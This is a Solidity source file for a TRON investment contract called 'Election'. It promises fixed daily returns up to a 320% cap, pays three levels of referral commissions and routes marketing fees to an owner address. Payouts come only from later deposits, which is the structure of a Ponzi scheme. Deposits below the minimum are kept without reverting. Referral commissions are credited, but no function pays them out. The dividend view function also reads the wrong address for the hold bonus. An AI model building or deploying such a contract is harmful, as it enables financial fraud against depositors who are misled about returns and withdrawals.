//SourceUnit: Election.sol

pragma solidity >=0.4.22 <0.6.0;

contract Election{

    using SafeMath for uint256;

    uint256 public constant MinimumInvest = 200000000;
    uint256 public constant MarketingFee = 1000;
    uint256[] public ReferralCommissions = [1000, 300, 200];
    uint256 public constant Day = 1 days;
    uint256 public constant ROICap = 32000;
    uint256 public constant PercentDiv = 10000;
    uint256 public constant ContractIncreaseEach = 5000000;
    uint256 public constant StartBonus = 300;
    uint256 public constant ContractBonus = 200;
    uint256 public constant HoldBonus = 200;

    uint256 public TotalInvestors;
    uint256 public TotalInvested;
    uint256 public TotalWithdrawn;
    uint256 public TotalDepositCount;
    uint256 public CurrentBonus;

    address payable public MarketingFeeAddress;

    struct Deposit {
        uint256 amount;
        uint256 withdrawn;
        uint256 start;
    }

    struct Commissions {
        address Downline;
        uint256 Earned;
        uint256 Invested;
        uint256 Level;
        uint256 DepositTime;
    }

    struct User {
        Deposit[] deposits;
        Commissions[] commissions;
        uint256 checkpoint;
        address upline;
        uint256 totalinvested;
        uint256 totalwithdrawn;
        uint256 totalcommisions;
        uint256 lvlonecommisions;
        uint256 lvltwocommisions;
        uint256 lvlthreecommisions;
        uint256 availablecommisions;
    }

    mapping(address => User) internal users;

    event ReferralBonus(
        address indexed referrer,
        address indexed referral,
        uint256 indexed level,
        uint256 amount
    );
    event NewDeposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event Status(string Contractstatus);

    constructor (
        address payable MarketingAddress
        ) public {
        require(!isContract(MarketingAddress));
        MarketingFeeAddress = MarketingAddress;
        CurrentBonus = StartBonus;
    }
    
    function Invest(address InvestorUpline) public payable {
        if (msg.value < MinimumInvest) {
            emit Status("Minimum invest is 200 TRX");
        } else {
            require(msg.value >= MinimumInvest, "No dividends available");
            MarketingFeeAddress.transfer(
                msg.value.mul(MarketingFee).div(PercentDiv)
            );

            User storage user = users[msg.sender];

            if (
                user.upline == address(0) &&
                users[InvestorUpline].deposits.length > 0 &&
                InvestorUpline != msg.sender
            ) {
                user.upline = InvestorUpline;
            }

            if (user.upline != address(0)) {
                address upline = user.upline;
                for (uint256 i = 0; i < 3; i++) {
                    if (upline != address(0)) {
                        uint256 amount =
                            msg.value.mul(ReferralCommissions[i]).div(PercentDiv);
                        users[upline].totalcommisions = users[upline]
                            .totalcommisions
                            .add(amount);
                        users[upline].availablecommisions = users[upline]
                            .availablecommisions
                            .add(amount);

                        if (i == 0) {
                            users[upline].lvlonecommisions = users[upline]
                                .lvlonecommisions
                                .add(amount);
                        }
                        if (i == 1) {
                            users[upline].lvltwocommisions = users[upline]
                                .lvltwocommisions
                                .add(amount);
                        }
                        if (i == 2) {
                            users[upline].lvlthreecommisions = users[upline]
                                .lvlthreecommisions
                                .add(amount);
                        }
                        users[upline].commissions.push(
                            Commissions(
                                msg.sender,
                                amount,
                                msg.value,
                                i,
                                block.timestamp
                            )
                        );
                        emit ReferralBonus(upline, msg.sender, i, amount);
                        upline = users[upline].upline;
                    } else break;
                }
            }

            if (user.upline == address(0)) {
                uint256 advertise = 900;
                MarketingFeeAddress.transfer(
                    msg.value.mul(advertise).div(PercentDiv)
                );
            }

            if (user.deposits.length == 0) {
                user.checkpoint = block.timestamp;
                TotalInvestors = TotalInvestors.add(1);
            }

            user.deposits.push(Deposit(msg.value, 0, block.timestamp));
            user.totalinvested = user.totalinvested.add(msg.value);
            TotalDepositCount = TotalDepositCount.add(1);
            TotalInvested = TotalInvested.add(msg.value);
            UpdateContractBonus();

            emit NewDeposit(msg.sender, msg.value);
        }
    }

    function WithdrawDividends() public {
        User storage user = users[msg.sender];
        uint256 userPercentRate = CurrentBonus.add(GetHoldBonus(msg.sender));
        uint256 toSend;
        uint256 dividends;
        uint256 ResetHoldBonus;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (
                user.deposits[i].withdrawn <
                ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))
            ) {
                if (user.deposits[i].start > user.checkpoint) {
                    dividends = (
                        user.deposits[i].amount.mul(userPercentRate).div(
                            PercentDiv
                        )
                    )
                        .mul(block.timestamp.sub(user.deposits[i].start))
                        .div(Day);
                    ResetHoldBonus = ResetHoldBonus.add(1);
                } else {
                    dividends = (
                        user.deposits[i].amount.mul(userPercentRate).div(
                            PercentDiv
                        )
                    )
                        .mul(block.timestamp.sub(user.checkpoint))
                        .div(Day);
                    ResetHoldBonus = ResetHoldBonus.add(1);
                }
                if (
                    user.deposits[i].withdrawn.add(dividends) >=
                    ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))
                ) {
                    dividends = (
                        ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))
                    )
                        .sub(user.deposits[i].withdrawn);
                    ResetHoldBonus = 0;
                }
                user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(
                    dividends
                );
                toSend = toSend.add(dividends);
            }
        }

        if (toSend <= 0) {
            emit Status("You can't withdraw money at this moment");
        } else {
            require(toSend > 0, "No dividends available");

            uint256 contractBalance = address(this).balance;
            if (contractBalance < toSend) {
                toSend = contractBalance;
            }
            if (ResetHoldBonus != 0) {
                user.checkpoint = block.timestamp;
            }
            msg.sender.transfer(toSend);
            TotalWithdrawn = TotalWithdrawn.add(toSend);
            user.totalwithdrawn = user.totalwithdrawn.add(toSend);
            emit Withdrawal(msg.sender, toSend);
        }
    }

    function GetUserDividends(address userAddress)
        public
        view
        returns (uint256)
    {
        User storage user = users[userAddress];
        uint256 userPercentRate = CurrentBonus.add(GetHoldBonus(msg.sender));
        uint256 totalDividends;
        uint256 dividends;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (
                user.deposits[i].withdrawn <
                ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))
            ) {
                if (user.deposits[i].start > user.checkpoint) {
                    dividends = (
                        user.deposits[i].amount.mul(userPercentRate).div(
                            PercentDiv
                        )
                    )
                        .mul(block.timestamp.sub(user.deposits[i].start))
                        .div(Day);
                } else {
                    dividends = (
                        user.deposits[i].amount.mul(userPercentRate).div(
                            PercentDiv
                        )
                    )
                        .mul(block.timestamp.sub(user.checkpoint))
                        .div(Day);
                }
                if (
                    user.deposits[i].withdrawn.add(dividends) >
                    ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))
                ) {
                    dividends = (
                        (user.deposits[i].amount.mul(ROICap)).div(PercentDiv)
                    )
                        .sub(user.deposits[i].withdrawn);
                }
                totalDividends = totalDividends.add(dividends);
            }
        }
        return totalDividends;
    }

    function GetHoldBonus(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];
        if (user.checkpoint > 0) {
            uint256 timeMultiplier =
                ((now.sub(user.checkpoint)).div(Day)).mul(5);
            if (timeMultiplier > HoldBonus) {
                timeMultiplier = HoldBonus;
            }
            return timeMultiplier;
        } else {
            return 0;
        }
    }

    function GetTotalCommission(address userAddress)
        public
        view
        returns (uint256)
    {
        User storage user = users[userAddress];
        return (user.commissions.length);
    }

    function GetUserCommission(address userAddress, uint256 index)
        public
        view
        returns (
            address,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        User storage user = users[userAddress];
        return (
            user.commissions[index].Downline,
            user.commissions[index].Earned,
            user.commissions[index].Invested,
            user.commissions[index].Level,
            user.commissions[index].DepositTime
        );
    }

    function GetUserData()
        public
        view
        returns (
            address,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        User storage user = users[msg.sender];
        return (
            user.upline,
            user.totalinvested,
            user.totalwithdrawn,
            user.totalcommisions,
            user.lvlonecommisions,
            user.lvltwocommisions,
            user.lvlthreecommisions,
            user.availablecommisions,
            user.checkpoint
        );
    }

    function GetUserTotalDeposits(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].deposits.length;
    }

    function GetUserDepositInfo(address userAddress, uint256 index)
        public
        view
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        User storage user = users[userAddress];
        return (
            user.deposits[index].amount,
            user.deposits[index].withdrawn,
            user.deposits[index].start
        );
    }

    function GetContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function UpdateContractBonus() internal {
        uint256 contractBalancePercent =
            TotalInvested.div(ContractIncreaseEach);
        if (contractBalancePercent > ContractBonus) {
            contractBalancePercent = ContractBonus;
        }
        CurrentBonus = StartBonus.add(contractBalancePercent);
    }

}

library SafeMath {
    function fxpMul(
        uint256 a,
        uint256 b,
        uint256 base
    ) internal pure returns (uint256) {
        return div(mul(a, b), base);
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}